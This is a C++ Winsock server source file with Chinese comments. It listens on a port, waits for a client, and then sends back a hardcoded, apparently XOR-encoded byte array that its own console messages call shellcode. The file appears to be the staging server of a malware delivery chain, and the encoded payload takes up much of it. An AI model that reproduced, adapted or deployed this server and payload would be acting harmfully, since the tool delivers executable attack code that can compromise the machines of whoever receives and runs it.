#include <WinSock2.h>
#include <iostream>
#pragma comment(lib, "ws2_32.lib")

using namespace std;


int main(int argc, char* argv[])
{
	const int BUF_SIZE = 1024;
	WSADATA         wsd;            //WSADATA变量
	SOCKET          sServer;        //服务器套接字
	SOCKET          sClient;        //客户端套接字
	SOCKADDR_IN     addrServ;;      //服务器地址
	char            buf[BUF_SIZE];  //接收数据缓冲区
	char			sendBuf[] = "\xf6\xe2\x88\x0a\x0a\x0a\x6a\x83\xef\x3b\xca\x6e\x81\x5a\x3a\x81\x58\x06\x81\x58\x1e\x81\x78\x22\x05\xbd\x40\x2c\x3b\xf5\xa6\x36\x6b\x76\x08\x26\x2a\xcb\xc5\x07\x0b\xcd\xe8\xf8\x58\x5d\x81\x58\x1a\x81\x40\x36\x81\x46\x1b\x72\xe9\x42\x0b\xdb\x5b\x81\x53\x2a\x0b\xd9\x81\x43\x12\xe9\x30\x43\x81\x3e\x81\x0b\xdc\x3b\xf5\xa6\xcb\xc5\x07\x0b\xcd\x32\xea\x7f\xfc\x09\x77\xf2\x31\x77\x2e\x7f\xee\x52\x81\x52\x2e\x0b\xd9\x6c\x81\x06\x41\x81\x52\x16\x0b\xd9\x81\x0e\x81\x0b\xda\x83\x4e\x2e\x2e\x51\x51\x6b\x53\x50\x5b\xf5\xea\x55\x55\x50\x81\x18\xe1\x87\x57\x62\x39\x38\x0a\x0a\x62\x7d\x79\x38\x55\x5e\x62\x46\x7d\x2c\x0d\x83\xe2\xf5\xda\xb2\x9a\x0b\x0a\x0a\x23\xce\x5e\x5a\x62\x23\x8a\x61\x0a\xf5\xdf\x60\x00\x62\x72\x45\x48\x30\x62\x08\x0a\x14\x6b\x83\xec\x5a\x5a\x5a\x5a\x4a\x5a\x4a\x5a\x62\xe0\x05\xd5\xea\xf5\xdf\x9d\x60\x1a\x5c\x5d\x62\x93\xaf\x7e\x6b\xf5\xdf\x8f\xca\x7e\x00\xf5\x44\x02\x7f\xe6\xe2\x6d\x0a\x0a\x0a\x60\x0a\x60\x0e\x5c\x5d\x62\x08\xd3\xc2\x55\xf5\xdf\x89\xf2\x0a\x74\x3c\x81\x3c\x60\x4a\x62\x0a\x1a\x0a\x0a\x5c\x60\x0a\x62\x52\xae\x59\xef\xf5\xdf\x99\x59\x60\x0a\x5c\x59\x5d\x62\x08\xd3\xc2\x55\xf5\xdf\x89\xf2\x0a\x77\x22\x52\x62\x0a\x4a\x0a\x0a\x60\x0a\x5a\x62\x01\x25\x05\x3a\xf5\xdf\x5d\x62\x7f\x64\x47\x6b\xf5\xdf\x54\x54\xf5\x06\x2e\x05\x8f\x7a\xf5\xf5\xf5\xe3\x91\xf5\xf5\xf5\x0b\xc9\x23\xcc\x7f\xcb\xc9\xb1\xfa\xbf\xa8\x5c\x60\x0a\x59\xf5\xdf";
	int             retVal;         //返回值

	if (argc <= 1){
		cout << "USAGE: server.exe <Listen Port>" << endl;
		return -1;
	}

	if (WSAStartup(MAKEWORD(2, 2), &wsd) != 0)//初始化套结字动态库
	{
		cout << "WSAStartup failed!" << endl;
		return 1;
	}

	//创建套接字
	sServer = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (INVALID_SOCKET == sServer)
	{
		cout << "Socket Failed!" << endl;
		WSACleanup();//释放套接字资源;
		return  -1;
	}

	//服务器套接字地址
	addrServ.sin_family = AF_INET;
	addrServ.sin_port = htons((short)atoi(argv[1]));;
	addrServ.sin_addr.s_addr = htonl(INADDR_ANY);

	//绑定套接字
	retVal = bind(sServer, (LPSOCKADDR)&addrServ, sizeof(SOCKADDR_IN));
	if (SOCKET_ERROR == retVal)
	{
		cout << "Bind Failed!" << endl;
		closesocket(sServer);   //关闭套接字
		WSACleanup();           //释放套接字资源;
		return -1;
	}

	//开始监听 
	retVal = listen(sServer, 1);
	if (SOCKET_ERROR == retVal)
	{
		cout << "Listen Failed!" << endl;
		closesocket(sServer);   //关闭套接字
		WSACleanup();           //释放套接字资源;
		return -1;
	}
	cout << "开始监听中...." << endl;

	//接受客户端请求
	sockaddr_in addrClient;
	int addrClientlen = sizeof(addrClient);
	sClient = accept(sServer, (sockaddr FAR*)&addrClient, &addrClientlen); // 生成对应当前客户端连接的套接字sClient
	if (INVALID_SOCKET == sClient)
	{
		cout << "Accept Failed!" << endl;
		closesocket(sServer);   //关闭套接字
		WSACleanup();           //释放套接字资源;
		return -1;
	}

	int flag = 1; //只接收一次
	while (flag)
	{
		//接收客户端数据
		ZeroMemory(buf, BUF_SIZE); // 填充为0 防止内存分配发生意外

		retVal = recv(sClient, buf, BUF_SIZE, 0); // 接收数据放在buf缓冲区

		if (SOCKET_ERROR == retVal) //判断是否接收错误
		{
			cout << "Recv Failed!" << endl;
			closesocket(sServer);   //关闭套接字
			closesocket(sClient);   //关闭套接字     
			WSACleanup();           //释放套接字资源;
			return -1;
		}
		if (buf[0] == '0')
			break;

		cout << "成功建立通信" << endl;
		send(sClient, sendBuf, sizeof(sendBuf), 0);
		cout << "向客户端发送shellcode..." << endl;
		cout << "发送shellcode成功!" << endl;
		flag = 0;

	}
	//退出
	closesocket(sServer);   //关闭套接字
	closesocket(sClient);   //关闭套接字
	WSACleanup();           //释放套接字资源;

	return 0;
}